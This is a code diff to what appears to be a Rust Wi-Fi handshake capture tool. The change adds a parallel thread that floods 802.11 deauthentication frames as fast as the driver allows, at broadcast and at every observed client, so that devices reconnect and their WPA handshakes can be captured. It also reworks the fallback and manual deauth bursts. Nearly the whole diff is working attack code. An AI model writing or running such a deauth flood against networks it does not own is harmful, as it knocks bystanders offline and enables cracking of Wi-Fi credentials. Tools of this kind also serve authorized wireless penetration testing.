@@ -9,7 +9,8 @@ use std::collections::HashMap;
 use std::process::Command;
 use std::str;
 use std::sync::atomic::{AtomicBool, Ordering};
-use std::sync::Arc;
+use std::sync::{Arc, Mutex};
+use std::thread;
 use std::time::Duration;
 
 fn get_all_wifi_channels() -> Vec<u32> {
@@ -608,6 +609,70 @@ pub fn capture_traffic(options: CaptureOptions) -> Result<Option<String>> {
     // Helper to find BSSID from SSID if needed
     let target_ssid_bytes = ssid.map(|s| s.as_bytes());
 
+    // ---- Parallel deauth sender ----
+    // State shared with a dedicated sender thread so deauth frames go out
+    // continuously, in parallel with packet capture, instead of a small burst
+    // every 0.5s from the capture loop.
+    let shared_bssid: Arc<Mutex<Option<[u8; 6]>>> = Arc::new(Mutex::new(parsed_bssid));
+    let shared_clients: Arc<Mutex<Vec<[u8; 6]>>> = Arc::new(Mutex::new(Vec::new()));
+
+    // Try to open a *second* injection handle on the same interface so sending
+    // never blocks the capture read. If the OS refuses a second monitor-mode
+    // handle (common on macOS), we fall back to in-loop bursts below.
+    let inject_handle = if !no_deauth {
+        match Capture::from_device(interface) {
+            Ok(dev) => dev.promisc(true).rfmon(true).timeout(100).open().ok(),
+            Err(_) => None,
+        }
+    } else {
+        None
+    };
+
+    let parallel_deauth_active = if let Some(mut inj) = inject_handle {
+        let running_t = running.clone();
+        let bssid_t = shared_bssid.clone();
+        let clients_t = shared_clients.clone();
+        thread::spawn(move || {
+            println!(
+                "{}",
+                "🚀 Parallel deauth sender started (continuous, as fast as the driver allows)"
+            );
+            while running_t.load(Ordering::SeqCst) {
+                let bssid_opt = *bssid_t.lock().unwrap();
+                match bssid_opt {
+                    Some(bssid) => {
+                        let clients = clients_t.lock().unwrap().clone();
+                        // Tight batch: broadcast + every known client, repeated.
+                        for _ in 0..20 {
+                            let _ = send_deauth(
+                                &mut inj,
+                                &bssid,
+                                &[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF],
+                            );
+                            for client in &clients {
+                                let _ = send_deauth(&mut inj, &bssid, client);
+                            }
+                        }
+                        // Minimal pause so we don't peg a core or overrun the TX ring.
+                        thread::sleep(Duration::from_millis(1));
+                    }
+                    // Target AP not identified yet — wait for the capture loop.
+                    None => thread::sleep(Duration::from_millis(100)),
+                }
+            }
+            println!("{}", "🛑 Parallel deauth sender stopped");
+        });
+        true
+    } else {
+        if !no_deauth {
+            println!(
+                "{}",
+                "⚠️  Could not open a second injection handle; falling back to in-capture deauth bursts."
+            );
+        }
+        false
+    };
+
     // State for handshake detection
     let mut pending_handshakes: HashMap<[u8; 6], [u8; 32]> = HashMap::new(); // Client Mac -> Anonce (from M1)
     let mut bssid_to_ssid: HashMap<[u8; 6], String> = HashMap::new(); // BSSID -> SSID mapping
@@ -876,18 +941,31 @@ pub fn capture_traffic(options: CaptureOptions) -> Result<Option<String>> {
             last_channel_switch = std::time::Instant::now();
         }
 
-        // 3. Deauth Attack Logic (Skip if no_deauth is true or on macOS which doesn't support injection)
-        // Send deauth burst every 0.5 seconds if we have a target
+        // 3. Deauth logic.
         if !no_deauth {
-            if let Some(bssid) = target_bssid {
+            if parallel_deauth_active {
+                // Keep the parallel sender's shared state up to date.
+                if let Some(b) = target_bssid {
+                    *shared_bssid.lock().unwrap() = Some(b);
+                }
+                {
+                    let mut cl = shared_clients.lock().unwrap();
+                    if cl.len() != pending_handshakes.len() {
+                        cl.clear();
+                        cl.extend(pending_handshakes.keys().copied());
+                    }
+                }
+                // The dedicated thread already deauths continuously, so the
+                // manual button is redundant here — just clear the flag.
+                if let Some(flag) = &deauth_requested {
+                    flag.store(false, Ordering::SeqCst);
+                }
+            } else if let Some(bssid) = target_bssid {
+                // Fallback (no second handle): in-capture burst every 0.5s.
                 if last_deauth.elapsed() >= Duration::from_millis(500) {
-                    // Send deauth frames (Burst) - Note: Will silently fail on macOS
                     for _ in 0..3 {
-                        // 1. Broadcast Deauth
                         let _ =
                             send_deauth(&mut cap, &bssid, &[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
-
-                        // 2. Targeted Deauth for known clients
                         for client in pending_handshakes.keys() {
                             let _ = send_deauth(&mut cap, &bssid, client);
                         }
@@ -897,37 +975,34 @@ pub fn capture_traffic(options: CaptureOptions) -> Result<Option<String>> {
             }
         }
 
-        // 4. Manual deauth trigger (user-initiated from the UI).
-        // Runs independently of `no_deauth`: sends one bounded burst against the
-        // target AP to force connected clients to reconnect (and thus produce a
-        // capturable handshake). Note: packet injection silently fails on most
-        // macOS/Apple Silicon setups.
-        if let Some(flag) = &deauth_requested {
-            if flag.swap(false, Ordering::SeqCst) {
-                match target_bssid {
-                    Some(bssid) => {
-                        let clients = pending_handshakes.len();
-                        for _ in 0..5 {
-                            // Broadcast deauth (all clients on the AP).
-                            let _ = send_deauth(
-                                &mut cap,
-                                &bssid,
-                                &[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF],
-                            );
-                            // Targeted deauth for any clients we have seen.
-                            for client in pending_handshakes.keys() {
-                                let _ = send_deauth(&mut cap, &bssid, client);
+        // 4. Manual deauth trigger — only in fallback / passive mode (when the
+        // parallel sender is not running). Sends one bounded burst on demand.
+        if !parallel_deauth_active {
+            if let Some(flag) = &deauth_requested {
+                if flag.swap(false, Ordering::SeqCst) {
+                    match target_bssid {
+                        Some(bssid) => {
+                            let clients = pending_handshakes.len();
+                            for _ in 0..5 {
+                                let _ = send_deauth(
+                                    &mut cap,
+                                    &bssid,
+                                    &[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF],
+                                );
+                                for client in pending_handshakes.keys() {
+                                    let _ = send_deauth(&mut cap, &bssid, client);
+                                }
                             }
+                            println!(
+                                "📣 Manual deauth burst sent to {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} (broadcast + {} known client(s))",
+                                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], clients
+                            );
                         }
-                        println!(
-                            "📣 Manual deauth burst sent to {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} (broadcast + {} known client(s))",
-                            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], clients
-                        );
-                    }
-                    None => {
-                        println!(
-                            "⚠️  Deauth requested, but the target AP has not been identified yet. Keep capturing until the target SSID's beacon is seen."
-                        );
+                        None => {
+                            println!(
+                                "⚠️  Deauth requested, but the target AP has not been identified yet. Keep capturing until the target SSID's beacon is seen."
+                            );
+                        }
                     }
                 }
             }
